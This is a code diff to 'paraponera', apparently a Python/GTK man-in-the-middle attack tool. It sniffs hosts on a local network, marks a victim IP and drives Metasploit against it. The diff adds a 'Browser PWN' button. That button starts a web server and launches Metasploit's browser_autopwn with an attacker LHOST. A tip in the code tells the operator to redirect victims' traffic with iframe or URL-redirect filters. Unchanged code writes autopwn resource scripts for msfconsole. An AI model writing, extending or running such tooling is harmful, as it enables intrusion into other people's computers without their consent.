@@ -107,6 +107,7 @@ class paraponera (object):
 		self.request_file = '/tmp/paraponera.log'
 		
 		self.filter_type = ''
+
 		
 		self.gateway_txt = self.builder.get_object("gateway_txt")
 		self.filter_gateway_txt = self.builder.get_object("filter_gateway_txt")
@@ -115,9 +116,10 @@ class paraponera (object):
 		self.manual_txt = self.builder.get_object("manual_txt")
 		self.autopwn_ip_txt = self.builder.get_object("autopwn_ip_txt")
 		self.exploit_txt = self.builder.get_object("exploit_txt")
-		self.msf_command_txt = self.builder.get_object("msf_command_txt")
 		self.filter1_txt = self.builder.get_object("filter1_txt")
 		self.filter2_txt = self.builder.get_object("filter2_txt")
+		self.lhostautopwd_txt = self.builder.get_object("lhostautopwd_txt")
+		self.uriautopwd_txt = self.builder.get_object("uriautopwd_txt")
 		
 		
 		
@@ -143,10 +145,9 @@ class paraponera (object):
 		self.autopwn_bt = self.builder.get_object("autopwn_bt")
 		self.get_password_bt = self.builder.get_object("get_password_bt")
 		self.images_refresh_bt = self.builder.get_object("images_refresh_bt")
+		self.bautopwn_bt = self.builder.get_object("bautopwn_bt")
 		
-		self.open_xterm_ck = self.builder.get_object("open_xterm_ck")
 		
-
 		self.scrollimages = self.builder.get_object("scrolledwindow2")
 		self.scrollcomputers = self.builder.get_object("scrolledwindow1")
 		self.password_scroll = self.builder.get_object("password_scroll")
@@ -154,7 +155,7 @@ class paraponera (object):
 		self.attack_image = gtk.gdk.pixbuf_new_from_file(os.getcwd() +"/res/paraponera-ico.png")
 		self.pixbuf = gtk.CellRendererPixbuf();
 
-		self.liststore = gtk.ListStore(str,str,str,gtk.gdk.Pixbuf)
+		self.liststore = gtk.ListStore(str,str,gtk.gdk.Pixbuf)
 		self.treeview = gtk.TreeView(self.liststore)
 
 
@@ -166,8 +167,8 @@ class paraponera (object):
 		self.treeview.append_column(self.column_IP)
 		self.column_COMPUTER = gtk.TreeViewColumn("COMPUTER")
 		self.treeview.append_column(self.column_COMPUTER)
-		self.column_OS = gtk.TreeViewColumn("OS")
-		self.treeview.append_column(self.column_OS)
+		#self.column_OS = gtk.TreeViewColumn("OS")
+		#self.treeview.append_column(self.column_OS)
 		self.column_ATTACK = gtk.TreeViewColumn("ATTACK")
 		self.treeview.append_column(self.column_ATTACK)
 	
@@ -180,11 +181,11 @@ class paraponera (object):
 		self.column_COMPUTER.pack_start(self.cell, False)
 		self.column_COMPUTER.add_attribute(self.cell, "text", 1)
 
-		self.column_OS.pack_start(self.cell, False)
-		self.column_OS.add_attribute(self.cell, "text", 2)
+		#self.column_OS.pack_start(self.cell, False)
+		#self.column_OS.add_attribute(self.cell, "text", 2)
 
 		self.column_ATTACK.pack_start(self.cell_image, expand=False)
-		self.column_ATTACK.add_attribute(self.cell_image,'pixbuf', 3)
+		self.column_ATTACK.add_attribute(self.cell_image,'pixbuf', 2)
 
 		
 		self.scrollcomputers.add(self.treeview)
@@ -215,6 +216,12 @@ class paraponera (object):
 		except:
 			pass
 		
+		
+		try:
+			self.lhostautopwd_txt.set_text(str(self.get_ip()[0]))
+		except:
+			pass
+			
 		self.filter1_txt.set_visible(False)
 		self.filter2_txt.set_visible(False)
 		self.filter1_lb.set_visible(False)
@@ -225,7 +232,7 @@ class paraponera (object):
 		gtk.main()
 
 
-		
+
 		
 	def check_paths(self):
 		error_msg = ''
@@ -350,13 +357,8 @@ class paraponera (object):
 		filewrite.write("sessions -l\r\n")
 		filewrite.close()
 		
-		if (self.open_xterm_ck.get_active()):
-			os.system('xterm -T "EXPLOIT" -e ' + msfconsole_path + ' -r autopwn')
-		else:		
-			command = msfconsole_path   + ' -r autopwn'
-			thr = Thread(target= self.read_output, args=(textbuffer,self.exploit_txt, command))
-			thr.start()
-		
+		os.system('xterm -T "EXPLOIT" -e ' + msfconsole_path + ' -r autopwn')
+
 
 
 	def read_output(self,buffer,view,command):
@@ -412,20 +414,30 @@ class paraponera (object):
 
 			osystem = 'U/N'
 			
-			self.liststore.append([ip, hostname, osystem ,gtk.gdk.pixbuf_new_from_file(os.getcwd()+'/res/eye_closed.png')])
+			self.liststore.append([ip, hostname, gtk.gdk.pixbuf_new_from_file(os.getcwd()+'/res/eye_closed.png')])
 			
 			
 						
 		self.sniff_bt.set_label('Start')
 		
 	
-	
+	def bautopwn_bt_clicked_cb(self,*args):
+		os.system('service httpd start')
+		os.system('service apache2 start')
+		
+		textbuffer = self.exploit_txt.get_buffer()
+		command = 'echo  " TIP: You can use the Filters (redirect_url or insert_iframe) to redirect all traffic to you"'
+		thr = Thread(target= self.read_output, args=(textbuffer,self.exploit_txt, command))
+		thr.start()
+		os.system('xterm -T "Browser PWN" -e msfcli server/browser_autopwn LHOST='+ self.lhostautopwd_txt.get_text() + ' URIPATH='+ self.uriautopwd_txt.get_text() + ' E &')
+		
+		
 	def stop_bt_clicked_cb(self,*args):
 		self.terminate_pid()
 		
 		self.manual_bt.set_label('Sniff')
 		for row in self.liststore:
-			self.liststore.set_value(row.iter,3,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
+			self.liststore.set_value(row.iter,2,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
 		
 			
 	def filter_ch_file_set_cb(self,*args):
@@ -550,18 +562,6 @@ class paraponera (object):
 	def images_refresh_bt_clicked_cb(self, *args):
 		self.list_images()
 
-	def msf_command_txt_key_press_event_cb(self,  widget, event):
-			keyname = gtk.gdk.keyval_name(event.keyval)
-			
-			if (self.ip_victim != ''):
-				if ((keyname == 'Return') or(keyname == 'KP_Enter')):
-					textbuffer = self.exploit_txt.get_buffer()
-					command = 'msfconsole -q -x ' + self.msf_command_txt.get_text() 
-					thr = Thread(target= self.read_output, args=(textbuffer,self.exploit_txt, command))
-					thr.start()
-					self.msf_command_txt.set_text('')
-
-
 
 	def autopwn_bt_clicked_cb(self, *args):
 		self.ip_victim = self.autopwn_ip_txt.get_text()
@@ -660,8 +660,8 @@ class paraponera (object):
 			        self.ip_victim = self.liststore.get_value(iter, 0)
 			        self.filter_target_txt.set_text(self.ip_victim)
 			    	for row in self.liststore:
-						self.liststore.set_value(row.iter,3,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
-				self.liststore.set_value(iter,3,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye.png'))
+						self.liststore.set_value(row.iter,2,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
+				self.liststore.set_value(iter,2,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye.png'))
 				
 				self.start_sniffing()
 								
